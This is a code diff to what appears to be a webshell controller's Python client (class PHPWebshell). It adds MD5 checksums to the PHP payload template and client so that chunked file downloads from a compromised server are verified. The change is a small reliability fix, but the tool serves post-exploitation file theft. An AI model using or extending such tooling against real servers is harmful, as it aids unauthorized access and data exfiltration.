@@ -9,6 +9,7 @@ import random
 import string
 import functools
 import uuid
+import hashlib
 import typing as t
 from binascii import Error as BinasciiError
 
@@ -49,6 +50,7 @@ function decoder_echo_raw($s) {echo base64_encode($s);}
 
 def compress_phpcode_template(s):
     return re.sub(r" *\n+ +", "", s, re.M)
+
 
 SUBMIT_WRAPPER_PHP = compress_phpcode_template(
     """\
@@ -232,7 +234,8 @@ if(!is_file(FILEPATH)) {
     fseek($file, OFFSET);
     $content = fread($file, CHUNK_SIZE);
     fclose($file);
-    decoder_echo(base64_encode($content));
+    $md5 = md5($content);
+    decoder_echo(base64_encode($content).":".$md5);
 }
 """
 )
@@ -776,7 +779,7 @@ class PHPWebshell(PHPSessionInterface):
         coros = [download_chunk(i) for i in range(0, filesize, chunk_size)]
         chunks = await asyncio.gather(*coros)
         result = b""
-        for chunk in chunks:
+        for i, chunk in enumerate(chunks):
             if chunk == "WRONG_NOT_FILE":
                 raise exceptions.FileError("文件不存在或者不是一个普通文件")
             elif chunk == "WRONG_NO_PERMISSION":
@@ -784,7 +787,14 @@ class PHPWebshell(PHPSessionInterface):
             elif chunk == "WRONG_UNKNOWN":
                 raise exceptions.FileError("未知错误，下载文件失败")
             try:
-                result += base64.b64decode(chunk)
+                chunk_base64, chunk_md5 = chunk.split(":")
+                chunk_content = base64.b64decode(chunk_base64)
+                if hashlib.md5(chunk_content).hexdigest() != chunk_md5:
+                    print(hashlib.md5(chunk_content).hexdigest(), chunk_md5)
+                    raise exceptions.FileError(f"下载失败，第{i+1}块文件MD5不正确")
+                result += chunk_content
+            except exceptions.FileError as exc:
+                raise exc
             except Exception as exc:
                 raise exceptions.PayloadOutputError(
                     "解码失败，webshell返回的不是正确的base64"
